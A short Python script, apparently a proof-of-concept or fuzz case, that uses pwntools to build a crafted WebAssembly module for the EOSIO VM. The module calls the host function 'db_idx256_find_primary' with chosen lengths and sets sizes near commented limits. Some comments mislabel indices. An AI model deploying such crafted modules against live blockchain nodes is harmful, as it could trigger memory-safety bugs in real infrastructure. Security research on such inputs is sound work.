#!/usr/bin/env python

from pwn import *
from wasm import *

m = Module(
        TypeSection([
            TypeEntry(TYPE_FUNC, (TYPE_i64, TYPE_i64, TYPE_i64), ()), # type index 0
            TypeEntry(TYPE_FUNC, (TYPE_i64, TYPE_i64, TYPE_i64), ()), # type index 1
            TypeEntry(TYPE_FUNC, (TYPE_i64, ), ()),                   # type index 2
            TypeEntry(TYPE_FUNC, (), ()),                             # type index 3
            TypeEntry(TYPE_FUNC, (TYPE_i64, TYPE_i64, TYPE_i64,
                TYPE_i32, TYPE_i32, TYPE_i64), (TYPE_i32, )),         # type index 4
            ]),
        ImportSection([
            ImportEntry('env', 'db_idx256_find_primary', KIND_FUNCTION, 4), # function type[4]
            ]),
        FunctionSection([
            FunctionEntry(0), # function index 0 -> type[0]
            FunctionEntry(3), # function index 1 -> type[2]
            ]),
        TableSection([
            # 1024 is constraint
            TableEntry(TYPE_ANYFUNC, 1024), # memory index 0
            ]),
        MemorySection([
            # 528 is contraint (528 * 64 = 33792K)
            MemoryEntry(527), # memory index 0
            ]),
        GlobalSection([
            GlobalEntry(TYPE_i32, MUTABLE, CONST_i32(0)),
            ]),
        ExportSection([
            ExportEntry(KIND_FUNCTION, 'apply', 1), # points to function 0
            ]),
        ElemSection([
            ElemEntry(0, CONST_i32(0), [0]),
            ]),
        CodeSection([
            CodeEntry({TYPE_i32: 2, TYPE_i64: 1},
                ins_i64_const(0) +
                ins_i64_const(0) +
                ins_i64_const(0) +
                ins_i32_const(10) +
                ins_i32_const(20) +
                ins_i64_const(0) +
                ins_call(0) +
                ins_set_global(0) +
                ins_ret()),                                             # function 0
            CodeEntry({}, ins_ret()),                                   # function 1
            ]),
        DataSection([
            DataEntry(0, CONST_i32(1), 'test string\x00'),
            DataEntry(0, CONST_i32(4), 'empty string\x00'),
            DataEntry(0, CONST_i32(12), 'empty string\x00'),
            ]),
        UserSection('omg', 'data'), # useless in eosio
        )

print enhex(m)

with open('test.wasm', 'w') as fh:
    fh.write(m)
